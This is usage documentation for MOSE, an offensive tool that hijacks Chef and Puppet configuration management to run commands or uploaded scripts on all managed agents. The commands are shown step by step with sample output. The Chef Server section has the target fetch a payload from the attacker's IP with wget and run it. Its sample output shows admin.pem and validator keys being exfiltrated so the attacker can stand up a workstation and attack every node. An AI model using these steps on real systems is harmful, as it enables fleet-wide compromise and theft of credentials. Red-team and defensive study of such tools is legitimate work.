## Instructions to run a command
This will allow you specify a command that will be run on all target agents.

1. Run MOSE with the following options:
```
./mose <target CM> -c <command>
```
For example:
```
./mose chef -c "echo HELLO >> /tmp/friendlyFile.txt"
```

2. On the target, download the payload that is being served (assuming you opted to have MOSE serve it for you) and give it execute permissions.

3. Run the payload:
```
./<cm target>-<cm os>
```
For example:
```
./chef-linux
```

If you want to clean up after you're done, run the payload again with the `-c` option.

## Instructions to upload and run a file
This will allow you to specify a script or a binary that will be run on all target agents.

1. Run MOSE with the following options: 
```
./mose puppet -u <name of file>
```
For example:
```
./mose puppet -u /tmp/notevil.sh
```

2. On the target, download the payload that is being served (assuming you opted to have MOSE serve it for you) and give it execute permissions.

3. Extract the payload:
```
tar -vxf files.tar
```

4. Run the payload:
```
./<cm target>-<cm os>
```
For example:
```
./puppet-linux
```

If you want to clean up after you're done, run the payload again with the `-c` option. For example:
```
./puppet-linux -c
```

## Instructions to run against a Chef Server
If you land on a Chef Server (as opposed to a Chef Workstation), this will allow you to steal the files that you'll need to generate a workstation of your own and use it to attack the assets managed by the target Chef Server.

1. Run MOSE with the following options: 
```
./mose chef -c <command> -l <your ip address> -r <chef server hostname>:<chef server IP>
```
For example (using the [vagrant test environment](https://github.com/master-of-servers/chef-test-lab/tree/master/vagrant)):
```
./mose chef -c "touch /tmp/helloserver.txt && echo Hello, I am a file created by MOSE for Chef Server. >> /tmp/helloserver.txt" -l 192.168.58.29 -r chef-server:10.42.42.10
```

2. On the Chef Server, download the payload that is being served (assuming you opted to have MOSE serve it for you) and give it execute permissions.
For example (using the [vagrant test environment](https://github.com/master-of-servers/chef-test-lab/tree/master/vagrant)):
```
wget http://192.168.58.29:8090/chef-linux
```

3. Make it executable:
```
chmod +x chef-linux
```

4. Run the payload:
```
./chef-linux
```

5. Back on your machine, answer the prompts:
```
2020-09-26T18:30:59Z MSG : Is your target a chef workstation? [Y/n/q]
n
2020-09-26T18:31:09Z MSG : Is your target a chef server? [Y/n/q]
Y
2020-09-26T18:31:10Z MSG : Listener being served at http://192.168.58.29:9090/chef-linux for 60 seconds
```
6. Wait for the files that you need to take to be exfilled. 
For example:
```
2020-09-26T18:31:13Z INF : Successfully uploaded my_org

2020-09-26T18:31:13Z INF : Successfully exfilled admin.pem
2020-09-26T18:31:13Z INF : Successfully exfilled my_org-validator.pem

2020-09-26T18:32:10Z INF : Web server shutting down...
```
7. Eventually you will be dropped into the workstation, and you proceed with your attack from there as you would normally.
For example:
```
2020-09-26T18:34:41Z INF : Running knife ssl fetch, please wait...
2020-09-26T18:34:47Z MSG : The following nodes were identified: chef-agent-1 chef-agent-2 chef-agent-3
2020-09-26T18:34:47Z MSG : Do you want to target specific chef agents? [Y/n/q]
```

**Note:** You will get an error about the stealing of secrets - reason being that you don't have any on this workstation (you just stood it up yourself):
```
2020-09-26T19:06:38Z ERR : Error while getting the vault list error="/opt/chefdk/bin/knife [vault list] ERROR: Chef::Exceptions::InvalidDataBagPath: Data bag path '/root/.chef/data_bags' is invalid\n exit status 100"
```